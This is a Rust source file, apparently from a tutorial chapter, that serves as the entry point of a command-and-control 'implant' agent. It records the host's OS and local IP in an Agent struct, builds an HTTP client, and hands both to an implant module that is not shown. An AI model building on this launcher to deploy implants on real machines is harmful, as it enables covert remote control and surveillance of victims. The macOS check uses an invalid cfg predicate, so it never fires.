use uuid::Uuid;
use chrono::{DateTime, Utc};
use serde::{Serialize, Deserialize};
use serde_json;
use std::time::Duration;
use local_ip_address::local_ip;

mod implant;

#[derive(Serialize, Deserialize)]
pub struct Agent {
    pub id: Uuid,
    pub implant: bool,
    pub created_at:DateTime<Utc>, 
    pub last_seen: DateTime<Utc>,
    pub os: String,
    pub ip: String,
    pub username: String,
    pub hostname: String,
}

fn main() {
    println!("👾 Agent launched!");

    let mut agent_os: &str = "Unknown";
    if cfg!(windows){
        agent_os = "windows";
    }
    if cfg!(macos){
        agent_os = "macos";
    }

    let agent = Agent{
        id: Uuid::new_v4(),
        implant: true, 
        created_at: chrono::offset::Utc::now(),
        last_seen: chrono::offset::Utc::now(),
        os: agent_os.to_string(),
        ip: local_ip().unwrap().to_string(),
        username: "Unknown".to_string(),
        hostname: "Unknown".to_string()
    };

    let api_agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(10))
        .user_agent("ch_10_agent/0.1")
        .build();

    let _ = implant::run(&api_agent, agent);
}